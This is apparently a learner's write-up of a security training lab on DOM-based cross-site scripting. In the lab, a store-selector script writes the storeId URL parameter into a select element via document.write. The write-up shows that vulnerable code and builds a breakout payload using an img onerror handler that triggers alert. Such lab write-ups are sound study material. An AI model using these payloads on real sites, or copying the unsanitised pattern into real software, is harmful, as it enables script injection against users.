***LAB INFO:DOM XSS in document.write sink using source location.search inside a select element ***
MORE INFO:  This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. 




ANALYSIS: 
1.  <script>
                                var stores = ["London","Paris","Milan"];
                                var store = (new URLSearchParams(window.location.search)).get('storeId');
                                document.write('<select name="storeId">');
                                if(store) {
                                    document.write('<option selected>'+store+'</option>');
                                }
                                for(var i=0;i<stores.length;i++) {
                                    if(stores[i] === store) {
                                        continue;
                                    }
                                    document.write('<option>'+stores[i]+'</option>');
                                }
                                document.write('</select>');
    1.1 We can see this js code in the place of view details of a product hai
    1.2 Let's analyze this code: 
       1.2.1 var stores= ["London","Paris","Milan"] ==> The code is first storing the string "London", "Paris" and "Milan" into the stores variable
       1.2.2 var store=(new URLSearchParams(window.location.search)).get('storeId')) ==> The code is getting the value from storeId from the URLSearchParams and storing it into the variable store
       1.2.3 Example of 1.2.2 💡 Example

              If the page URL is:

             https://example.com?storeId=abc123

             Then:

             var store = (new URLSearchParams(window.location.search)).get('storeId');
            console.log(store); // Output: "abc123"

    1.3 document.write('<select name="storeId">'); ==> It writes a <select> dropdown with the name storeId into the web page using document.write().

    1.4 So, now we can try our write in the url and the storeId parameter hai.
    1.5 Let's do it::::
        1.5.1 product?productId=1&storeId=new ==> This write new in the dropdown menu in <select> tag of HTML
        1.5.2 Now I can inject my malicious payload there such as: product?productId=1&storeId=<img src=1 onerror=alert(1)> ==> This got injected but doesnot popup alert() ??? why
        1.5.3 Let's open the browser tool and search where it's:
            1.5.3.1 <select name="storeId"><option selected=""></option><option>London</option><option>Paris</option><option>Milan</option></select> it's shown like this now I have to be out of the <select> tag hai to trigger and xss.
            1.5.3.2 <select name="storeId"><option selected=""></select><img src=1 onerror=alert(1)>"></option><option>London</option><option>Paris</option><option>Milan</option></select>
            ***so our payload is: "></select><img src=1 onerror=alert(1)> ==> yes this payload trigges an alert now also let's see how it's been placed in web-developer tool hai
            1.5.3.3 I have attached an email where this tag is placed

        *** THANK YOU KEEP HACKING ***

